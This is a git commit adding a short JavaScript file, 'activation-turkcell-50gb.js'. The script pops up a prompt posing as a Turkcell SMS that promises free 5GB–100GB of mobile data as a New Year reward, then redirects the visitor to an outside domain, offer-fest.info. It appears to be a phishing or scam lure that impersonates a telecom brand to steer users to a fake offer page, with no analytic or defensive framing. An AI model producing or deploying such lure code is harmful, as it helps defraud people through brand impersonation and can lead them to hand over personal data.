ff1bb79529c3540d986a8f5f2536082bda4a5a27
ekpesense <abantak9@gmail.com>
2025-02-08 15:37:28 -0800

    Create activation-turkcell-50gb.js

---
+++ activation-turkcell-50gb.js
@@ -0,0 +1,5 @@
+var password = 'YENİ YIL HEDİYESİ'
+password=prompt('TURKCELL SMS: Değerli Turkcell Müşterisi 5GB - 100GB Arası Ücretsiz Data Alın, Yeni Yıl Müşteri Ödülü, Hemen Kontrol Etmek İçin YENİ YIL HEDİYESİ'ne Tıklayın ','YENİ YIL HEDİYESİ');
+if (password != 'YENİ YIL HEDİYESİ') {
+location.href='https://offer-fest.info/turkcell-50gb.html';
+}
